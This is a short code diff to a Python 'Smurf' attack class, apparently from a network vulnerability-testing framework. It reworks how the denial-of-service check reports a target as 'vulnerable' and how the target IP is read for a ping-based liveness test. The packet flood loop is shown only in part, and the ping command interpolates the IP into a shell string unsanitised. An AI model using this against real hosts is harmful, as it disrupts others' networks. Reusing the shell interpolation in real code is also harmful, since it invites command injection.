@@ -23,15 +23,17 @@ class Smurf(GenericAttack):
             send(packet)
             if not self.is_alive():
                 log.info('Host not responding!')
-                return {"status": "not_responding"}
+                result.update({"status": "vulnerable"})
+                return
 
-        return {"status": "responding"}
+        result.update({"status": "not"})
+        return
 
     def is_alive(self):
         """Check if the target is alive"""
-        if not self.config['target'].value is None:
+        if not self.device['ip'] is None:
             rval = self.init_app('ping -c 1 -w 1 %s' % \
-                                 self.config['target'].value, True)
+                                 self.device['ip'], True)
             up = search('\d.*? received', rval)
             if search('0', up.group(0)) is None:
                 return True
